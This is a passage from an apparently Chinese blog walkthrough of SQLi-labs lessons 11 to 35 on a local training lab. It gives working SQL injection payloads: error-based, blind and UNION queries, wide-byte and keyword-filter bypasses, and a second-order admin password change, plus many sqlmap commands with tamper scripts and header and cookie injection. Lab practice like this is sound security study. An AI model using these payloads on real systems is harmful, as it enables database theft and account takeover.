+<p>此处需要修改一下前缀文件内容如下，修改xml文件夹下boundaries.xml文件中的内容如下图所示,,,</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image042.gif" srcset="/img/loading.gif" lazyload alt="IMG_276"></p>
+<p>直接用sqlmap跑，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image044.gif" srcset="/img/loading.gif" lazyload alt="IMG_277"></p>
+<p>十一、 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-11/">http://127.0.0.1/sqli-labs-master/Less-11/</a></p>
+<p>11到21关的提交方式全是post型的，需要借助抓包工具，我这里使用burpsuite工具</p>
+<p>Burpsuite抓包，简单测试下，存在报错型注入</p>
+<p>uname&#x3D;admin’ and extractvalue(1,concat(0x7e,(select database()))) –+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image046.gif" srcset="/img/loading.gif" lazyload alt="IMG_278"></p>
+<p>直接sqlmap跑，，，，，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image048.gif" srcset="/img/loading.gif" lazyload alt="IMG_279"></p>
+<p>再测试下，存在UNION联合查询注入，如下图所示，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image050.gif" srcset="/img/loading.gif" lazyload alt="IMG_280"></p>
+<p>直接sqlmap跑，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image052.gif" srcset="/img/loading.gif" lazyload alt="IMG_281"></p>
+<p>十二、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-12/">http://127.0.0.1/sqli-labs-master/Less-12/</a></p>
+<p>双引号，报错型</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image054.gif" srcset="/img/loading.gif" lazyload alt="IMG_282"></p>
+<p>直接sqlmap跑，，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506657847007.req –technique E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image056.gif" srcset="/img/loading.gif" lazyload alt="IMG_283"></p>
+<p>十三、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-13/">http://127.0.0.1/sqli-labs-master/Less-13/</a></p>
+<p>抓包测试注入类型，输入参数内容被放到（‘’）中，注释符可用，如下图所示，，</p>
+<p><img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image058.gif" srcset="/img/loading.gif" lazyload alt="IMG_284"></p>
+<p>直接使用sqlmap跑，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506661582400.req –prefix “‘)” –technique E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image060.gif" srcset="/img/loading.gif" lazyload alt="IMG_285"></p>
+<p>十四、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-14/">http://127.0.0.1/sqli-labs-master/Less-14/</a></p>
+<p>输入内容被放到双引号中，报错型注入，注释符不可用，如下图所示，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image062.gif" srcset="/img/loading.gif" lazyload alt="IMG_286"></p>
+<p>使用sqlmap去跑，，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506662249280.req –technique E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image064.gif" srcset="/img/loading.gif" lazyload alt="IMG_287"></p>
+<p>十五、 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-15/">http://127.0.0.1/sqli-labs-master/Less-15/</a></p>
+<p>根据页面显示，可以测出为布尔和时间延迟的盲注，如下图所示</p>
+<p>uname&#x3D;admin’ and 1&#x3D;1 –+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image066.gif" srcset="/img/loading.gif" lazyload alt="IMG_288"></p>
+<p>uname&#x3D;admin’ and 1&#x3D;2 –+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image068.gif" srcset="/img/loading.gif" lazyload alt="IMG_289"></p>
+<p>uname&#x3D;admin’ and sleep(5) –+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p>页面响应延迟，可以看出存在时间延迟性注入，</p>
+<p>直接使用sqlmap跑，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506662373346.req –technique T –dbms mysql –batch -v 0 –threads 8</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image070.gif" srcset="/img/loading.gif" lazyload alt="IMG_290"></p>
+<p>布尔型盲注存在点问题，使用sqlmap工具没有跑出来，，，只能通过手工去爆了，苦逼，，</p>
+<p>十六、 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-16/">http://127.0.0.1/sqli-labs-master/Less-16/</a></p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image072.gif" srcset="/img/loading.gif" lazyload alt="IMG_291"></p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506664390744.req -p “uname” –technique T –dbms mysql –batch –level 3 –threads 8 -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image074.gif" srcset="/img/loading.gif" lazyload alt="IMG_292"></p>
+<p>十七、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-17/">http://127.0.0.1/sqli-labs-master/Less-17/</a></p>
+<p>报错型注入，单引号，注释符可用</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image076.gif" srcset="/img/loading.gif" lazyload alt="IMG_293"></p>
+<p>用sqlmap测试</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506754249224.req -p passwd –tech E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image078.gif" srcset="/img/loading.gif" lazyload alt="IMG_294"></p>
+<p>十八、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-18/">http://127.0.0.1/sqli-labs-master/Less-18/</a></p>
+<p>报错型，单引号，user-agent型注入点，，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image080.gif" srcset="/img/loading.gif" lazyload alt="IMG_295"></p>
+<p>直接用sqlmap跑，在http请求头的user-agent内容后面加上一个*号</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506757146400.req –user-agent Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;49.0.2623.112 Safari&#x2F;537.36 –tech E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image082.gif" srcset="/img/loading.gif" lazyload alt="IMG_296"></p>
+<p>十九、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-19/">http://127.0.0.1/sqli-labs-master/Less-19/</a></p>
+<p>报错型，单引号，referer型注入点，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image084.gif" srcset="/img/loading.gif" lazyload alt="IMG_297"></p>
+<p>直接用sqlmap跑，在http请求头的referer内容后面加上一个*号，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506757627681.req –referer <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-19/">http://127.0.0.1/sqli-labs-master/Less-19/</a> –tech E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image086.gif" srcset="/img/loading.gif" lazyload alt="IMG_298"></p>
+<p>二十、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-20/">http://127.0.0.1/sqli-labs-master/Less-20/</a></p>
+<p>报错型，单引号，cookie型注入</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image088.gif" srcset="/img/loading.gif" lazyload alt="IMG_299"></p>
+<p>直接用sqlmap测试，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506758959558.req –cookie uname&#x3D;admin –tech E –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image090.gif" srcset="/img/loading.gif" lazyload alt="IMG_300"></p>
+<p>二十一、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-21/">http://127.0.0.1/sqli-labs-master/Less-21/</a></p>
+<p>本关和20关相似，只是cookie的uname值经过base64编码了，使用sqlmap的时候直接带个脚本就行了，直接上sqlmap，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506759460951.req –cookie uname&#x3D;YWRtaW4%3D –tech E –dbms mysql –tamper base64encode.py –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image092.gif" srcset="/img/loading.gif" lazyload alt="IMG_301"></p>
+<p>二十二、 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-22/">http://127.0.0.1/sqli-labs-master/Less-22/</a></p>
+<p>报错型，双引号，base64编码，，没改payloads等级的需要使用–level 3 参数</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image094.gif" srcset="/img/loading.gif" lazyload alt="IMG_302"></p>
+<p><img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image096.gif" srcset="/img/loading.gif" lazyload alt="IMG_303"></p>
+<p>直接上SQL map，，</p>
+<p>sqlmap.py -r C:\Users\esafenet\AppData\Local\Temp\1506760318956.req –cookie uname&#x3D;YWRtaW4&#x3D; –tech E –dbms mysql –tamper base64encode.py –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image098.gif" srcset="/img/loading.gif" lazyload alt="IMG_304"></p>
+<p>二十三、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-23/">http://127.0.0.1/sqli-labs-master/Less-23/</a></p>
+<p>单引号，过滤了注释符，，直接上sqlmap吧，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image100.gif" srcset="/img/loading.gif" lazyload alt="IMG_305"></p>
+<p>二十四、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-24/?id=1">http://127.0.0.1/sqli-labs-master/Less-24/?id=1</a></p>
+<p>利用带有管理员账号的注册用户名，在修改密码的时候达到修改管理员账号密码的效果，，</p>
+<p>注册用户名：admin’ or ‘1’&#x3D;’1 密码为 admin</p>
+<p>注册成功后，登录进去修改密码，将密码改为 123</p>
+<p>更改后即可发现，admin用户的密码也被改成了123，</p>
+<p>自行脑补一下，update tables set password&#x3D;’123’ where username&#x3D;’admin’ or ‘1’&#x3D;’1’</p>
+<p>二十五、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-25/?id=1">http://127.0.0.1/sqli-labs-master/Less-25/?id=1</a></p>
+<p>过滤了and和or，绕过方法%26%26代替and，或者双写anandd来绕过，or用 || 或者oorr来代替即可绕过，，，话不多说，我这里直接修改脚本使用sqlmap来跑，，</p>
+<p>And2anandd.py脚本内容如下所示，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image102.gif" srcset="/img/loading.gif" lazyload alt="IMG_306"></p>
+<p>sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-25/?id=1">http://127.0.0.1/sqli-labs-master/Less-25/?id=1</a> -p id –tech E –dbms mysql –tamper and2anandd.py –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image104.gif" srcset="/img/loading.gif" lazyload alt="IMG_307"></p>
+<p>二十六、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-26/?id=1">http://127.0.0.1/sqli-labs-master/Less-26/?id=1</a></p>
+<p>此题过滤了所有空白字符，暂时未找到代替空格的字符，，，，，，欢迎大佬们分享^_^</p>
+<p>二十七、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-27/?id=1">http://127.0.0.1/sqli-labs-master/Less-27/?id=1</a></p>
+<p>union，select，空格，注释符被过滤，直接修改脚本结合sqlmap测试，使用%09，%0a等代替空格，双写代替select，，脚本和25题类似，，，直接用sqlmap测试，</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-27/?id=1">http://127.0.0.1/sqli-labs-master/Less-27/?id=1</a> -p id –prefix “‘“ –suffix “%0aand%0a’1’&#x3D;’1” –tech E –dbms mysql –tamper select2selecselectt.py,space2%0a.py –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image106.gif" srcset="/img/loading.gif" lazyload alt="IMG_308"></p>
+<p>二十八、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-28/?id=1">http://127.0.0.1/sqli-labs-master/Less-28/?id=1</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-28/?id=0%27)%0Aunionunion%0Aselect%0Aselect%0A1,2,3%0Aand%0A">http://127.0.0.1/sqli-labs-master/Less-28/?id=0%27)%0aunionunion%0aselect%0aselect%0a1,2,3%0aand%0a</a>(%271%27&#x3D;%271</p>
+<p>直接用sqlmap跑，本题过滤了union+空格+select和空格，但是sqlmap中使用的是union+all+select，那我们只需用其它空白字符替换空格即可，，</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-28/?id=1">http://127.0.0.1/sqli-labs-master/Less-28/?id=1</a> –prefix “‘)” –suffix “%0aand%0a(‘1’&#x3D;’1” –tech U –dbms mysql –tamper space2%0a.py –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image108.gif" srcset="/img/loading.gif" lazyload alt="IMG_309"></p>
+<p>测试发现不存在报错型注入，，，</p>
+<p>二十九、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-29/?id=1">http://127.0.0.1/sqli-labs-master/Less-29/?id=1</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">29</span>/?id=<span class="hljs-number">0</span>&#x27; union%<span class="hljs-number">0</span>aall select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=database() --+<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image110.gif" srcset="/img/loading.gif" lazyload alt="IMG_310"></p>
+<p>直接用sqlmap测试</p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-29/?id=1">http://127.0.0.1/sqli-labs-master/Less-29/?id=1</a> –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image112.gif" srcset="/img/loading.gif" lazyload alt="IMG_311"></p>
+<p>三十、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-30/?id=1">http://127.0.0.1/sqli-labs-master/Less-30/?id=1</a></p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-30/?id=1">http://127.0.0.1/sqli-labs-master/Less-30/?id=1</a> –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image114.gif" srcset="/img/loading.gif" lazyload alt="IMG_312"></p>
+<p>三十一、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-31/?id=1">http://127.0.0.1/sqli-labs-master/Less-31/?id=1</a></p>
+<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-31/?id=1">http://127.0.0.1/sqli-labs-master/Less-31/?id=1</a> –dbms mysql –batch -v 0</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image116.gif" srcset="/img/loading.gif" lazyload alt="IMG_313"></p>
+<p>三十二、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-32/?id=1">http://127.0.0.1/sqli-labs-master/Less-32/?id=1</a></p>
+<p>宽字节绕过引号转义</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqli-labs-master/Less-<span class="hljs-number">32</span>/?id=<span class="hljs-number">0</span>%df&#x27; union <span class="hljs-literal">all</span> select <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> from information_schema.tables where table_schema=database()--+<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-33/?id=0%EF%BF%BD%27%20union%20all%20select%201,2,3--"><img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image118.gif" srcset="/img/loading.gif" lazyload alt="IMG_314"></a></p>
+<p>三十三、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-33/">http://127.0.0.1/sqli-labs-master/Less-33/</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-33/?id=0%EF%BF%BD%27%20union%20all%20select%201,2,3--+">http://127.0.0.1/sqli-labs-master/Less-33/?id=0%df%27%20union%20all%20select%201,2,3--+</a></p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image120.gif" srcset="/img/loading.gif" lazyload alt="IMG_315"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-33/?id=0%EF%BF%BD%27%20union%20all%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+">http://127.0.0.1/sqli-labs-master/Less-33/?id=0%df%27%20union%20all%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+</a></p>
+<p><img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image122.gif" srcset="/img/loading.gif" lazyload alt="IMG_316"></p>
+<p>三十四、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-34/">http://127.0.0.1/sqli-labs-master/Less-34/</a></p>
+<p>burpsuite抓包，手工测试，，</p>
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image124.gif" srcset="/img/loading.gif" lazyload alt="IMG_317"></p>
+<p>三十五、<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-35">http://127.0.0.1/sqli-labs-master/Less-35</a></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli-labs-master/Less<span class="hljs-number">-35</span>/?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/../SQLi-lab%E6%B5%8B%E8%AF%95/clip_image126.gif" srcset="/img/loading.gif" lazyload alt="IMG_318"></p>
+<p>不知不觉这些东西就花了我一下午的时间，脖子有点疼，今天先搞到这里，后续分享用python编写的脚本来测试。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/10/%E7%BA%A2%E9%98%9F%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/">
+                        <span class="hidden-mobile">红队命令速查</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
